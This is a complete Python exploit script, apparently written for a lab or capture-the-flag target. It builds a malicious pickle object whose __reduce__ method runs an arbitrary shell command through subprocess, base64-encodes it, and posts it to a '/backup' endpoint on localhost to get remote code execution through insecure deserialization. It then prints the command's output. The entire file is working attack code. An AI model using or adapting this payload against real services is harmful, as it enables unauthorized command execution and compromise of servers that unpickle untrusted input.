import pickle
import base64
import subprocess
import requests
import sys

class RCE:
    def __init__(self, command):
        self.command = command
    def __reduce__(self):
        cmd = (self.command)
        return subprocess.check_output, (cmd.split(),)


if __name__ == '__main__':
    args = sys.argv[1:]
    if len(args) < 1:
        print("[!] Usage: python serialize.py <cmd>")
        sys.exit()
    command = " ".join(args)
    payload = base64.b64encode(pickle.dumps(RCE(command)))

    print("[+] Sending exploit")

    r = requests.post("http://localhost:5000/backup", data={"search": payload})
    if "No backup files found for" in r.text:
        print("[!] Exploit didn't work, try another command")
    else:
        print(f"[+] result: {r.text}")
